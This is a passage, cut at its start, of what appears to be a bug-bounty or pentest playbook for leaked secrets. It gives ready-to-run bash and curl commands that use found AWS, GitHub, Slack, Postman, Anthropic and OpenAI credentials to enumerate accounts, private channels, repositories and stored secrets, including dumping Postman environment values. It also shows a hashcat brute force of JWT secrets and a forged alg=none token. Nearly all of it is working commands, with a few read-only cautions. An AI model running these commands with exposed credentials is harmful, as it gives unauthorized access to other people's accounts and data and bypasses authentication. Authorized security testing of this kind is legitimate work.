export AWS_SECRET_ACCESS_KEY="..."

# IAM-user details (only if ARN was :user/)
aws iam get-user
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-groups-for-user --user-name $(aws iam get-user --query 'User.UserName' --output text)

# What can I actually do? (simulate-principal-policy for common dangerous actions)
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
  --action-names s3:ListAllMyBuckets ec2:DescribeInstances iam:ListUsers \
                 secretsmanager:ListSecrets ssm:DescribeParameters \
                 lambda:ListFunctions rds:DescribeDBInstances

# Read-only enumeration of common services (do not WRITE)
aws s3 ls
aws ec2 describe-instances --output table --query 'Reservations[*].Instances[*].[InstanceId,State.Name,Tags[?Key==`Name`].Value]'
aws secretsmanager list-secrets --query 'SecretList[*].Name'
aws ssm describe-parameters --query 'Parameters[*].Name'
aws lambda list-functions --query 'Functions[*].FunctionName'
aws rds describe-db-instances --query 'DBInstances[*].DBInstanceIdentifier'

# Check MFA enforcement on the user
aws iam get-account-summary | jq '.SummaryMap.AccountMFAEnabled'
aws iam list-mfa-devices --user-name <username>
```

**GitHub PAT — repo enum:**
```bash
TOKEN="ghp_..."
H="Authorization: token $TOKEN"

# Scopes already captured from X-OAuth-Scopes header
curl -sk -m 10 -I -H "$H" https://api.github.com/user | grep -i 'X-OAuth-Scopes'

# All repos accessible (own + collaborator + org member)
curl -sk -m 10 -H "$H" "https://api.github.com/user/repos?affiliation=owner,collaborator,organization_member&per_page=100"

# Per-org: members, repos, secrets (secrets endpoint is metadata-only — names not values)
ORG="<orgname>"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/members"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/repos?per_page=100"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/actions/secrets"   # requires admin:org

# Per-repo workflow secrets (metadata)
REPO="<orgname/reponame>"
curl -sk -m 10 -H "$H" "https://api.github.com/repos/$REPO/actions/secrets"
```

**Slack token — workspace enum:**
```bash
TOKEN="xoxb-..."
H="Authorization: Bearer $TOKEN"

# What conversations can I see? (sweeping check; respects scope)
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/conversations.list?types=public_channel,private_channel,mpim,im&limit=200" | jq '.channels[] | {id, name, is_private}'

# User list (only if scope includes users:read)
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/users.list?limit=100" | jq '.members[] | {name, real_name, is_admin}'

# DO NOT: chat.postMessage, files.upload, conversations.invite, etc.
```

**JWT — full triage workflow:**
```bash
JWT="eyJhbGciOiJIUzI1NiI..."

# Look for: alg (none = critical, HS256/HS384/HS512 = symmetric, RS256/RS512 = asymmetric, ES256 = ECDSA)

# Brute-force HS256 secret (if HS256 + short-secret suspicion)
hashcat -m 16500 "$JWT" /path/to/wordlist.txt

# Re-encode header with alg=none and empty signature; some libraries accept
NEW_JWT=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
NEW_JWT="${NEW_JWT}.$(echo "$JWT" | cut -d. -f2)."

# Test against API
```

**Postman PMAK — workspace enum:**
```bash
PMAK="PMAK-..."
H="X-Api-Key: $PMAK"

# Per-workspace collections
WS="<workspace-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/workspaces/$WS" | jq '.workspace.collections[]'
curl -sk -m 10 -H "$H" "https://api.getpostman.com/workspaces/$WS" | jq '.workspace.environments[]'

# Per-collection requests (where the secrets often live)
COL="<collection-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/collections/$COL" | jq '.collection.item[]'

# Environments (env vars often contain creds)
ENV="<environment-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/environments/$ENV" | jq '.environment.values[] | {key, value}'
```

**Anthropic API key — usage enum:**
```bash
KEY="sk-ant-api03-..."
H="x-api-key: $KEY"
A="anthropic-version: 2023-06-01"

# Usage / quota (admin-scoped tokens only):
curl -sk -m 10 -H "$H" -H "$A" https://api.anthropic.com/v1/organizations/usage_report | jq .

# DO NOT: send actual completion requests against organization budget
```

**OpenAI API key — usage enum:**
```bash
KEY="sk-..."
H="Authorization: Bearer $KEY"

# Files / fine-tunes (sometimes contain training data with PII)
curl -sk -m 10 -H "$H" https://api.openai.com/v1/files | jq .
curl -sk -m 10 -H "$H" https://api.openai.com/v1/fine_tuning/jobs | jq .
```

**Generic key — provenance enum:**
1. Find the consuming domain (where in JS bundle did the key appear? what URL is the bundle served from?).
2. Check the API docs of the inferred service.
3. If the key matches a known regex, lookup vendor-specific scope check.
4. If unknown service, search GitHub for the key prefix (`gh search code "<prefix>" --type=code`).
5. Identify scope before validating; some keys are write-broad on first use.

---
